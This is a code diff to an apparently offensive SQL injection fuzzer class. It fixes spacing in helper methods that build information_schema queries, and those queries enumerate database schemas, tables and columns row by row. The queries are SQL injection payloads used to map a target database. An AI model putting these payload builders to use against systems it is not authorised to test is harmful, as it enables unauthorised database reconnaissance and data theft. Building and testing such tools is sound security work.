@@ -41,30 +41,34 @@ class SQLi(Fuzzer):
     def schemas(cls, bias=-1):
         payload = "select distinct(SCHEMA_NAME) from information_schema.SCHEMATA"
         if bias >= 0:
-            payload += "limit %s,1" % bias
+            payload += " limit %s,1" % bias
+        else:
+            payload += " limit 1"
         return payload
 
     @classmethod
     def tables(cls, schema="", bias=-1):
         payload = "select distinct(TABLE_NAME) from information_schema.TABLES"
         if schema:
-            payload += "where TABLE_SCHEMA='%s'" % schema
+            payload += " where TABLE_SCHEMA='%s'" % schema
         if bias >= 0:
-            payload += "limit %s,1" % bias
+            payload += " limit %s,1" % bias
+        else:
+            payload += " limit 1"
         return payload
 
     @classmethod
     def columns(cls, schema="", table="", bias=-1):
         payload = "select distinct(COLUMN_NAME) from information_schema.COLUMNS"
         if schema:
-            payload += "where TABLE_SCHEMA='%s'" % schema
+            payload += " where TABLE_SCHEMA='%s'" % schema
         if table:
             if schema:
-                payload += "and TABLE_NAME='%s'" % table
+                payload += " and TABLE_NAME='%s'" % table
             else:
-                payload += "where TABLE_NAME='%s'" % table
+                payload += " where TABLE_NAME='%s'" % table
         if bias >= 0:
-            payload += "limit %s,1" % bias
+            payload += " limit %s,1" % bias
         return payload
 
     @classmethod
